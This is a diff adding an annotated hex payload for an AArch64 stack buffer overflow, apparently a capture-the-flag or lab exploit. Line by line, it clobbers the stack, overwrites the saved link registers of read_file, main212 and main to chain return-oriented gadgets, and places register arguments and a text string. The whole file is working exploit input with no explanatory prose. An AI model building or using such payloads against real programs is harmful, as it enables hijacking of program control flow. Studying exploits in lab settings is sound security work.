@@ -1,0 +1,51 @@
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+aa aa aa aa aa aa aa aa // Clobber read_file's saved x29
+54 3e 45 00 00 00 00 00 // Overwrite read_file's saved x30 (lr)
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+bb bb bb bb bb bb bb bb // Clobber main212's saved x29 (sp)
+80 9a 44 00 00 00 00 00 // Overwrite main212's lr for gadget 2
+61 61 61 61 62 62 62 62 // Clobbering for argument to x1
+63 63 63 63 64 64 64 64 // clobbering
+65 65 65 65 66 66 66 66 // clobbering
+c8 c6 f0 ff ff ff 00 00 // pointer to the string for x1
+ff ff ff ff 6A 6A 6A 6A // override main's x29
+a4 08 40 00 00 00 00 00 // override main's x30 (lr)
+6D 6D 6D 6D 6E 6E 6E 6E // clobbering
+6F 6F 6F 6F 70 70 70 70 // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+ff ff ff ff ff ff ff ff // clobbering
+61 61 61 61 62 62 62 62 // Clobbering below is for argument to x0 since argument is expected in sp + 96
+63 63 63 63 64 64 64 64 // clobbering
+65 65 65 65 66 66 66 66 // clobbering
+67 67 67 67 68 68 68 68 // clobbering
+69 69 69 69 70 70 70 70 // clobbering
+3C 00 00 00 00 00 00 00 // Argument for x0
+ff ff ff ff ff ff ff ff // Padding for the string
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+ff ff ff ff ff ff ff ff // padding
+70 68 33 33 72 6D 33 6E // text
+30 30 62 7A 00 00 00 00 // text
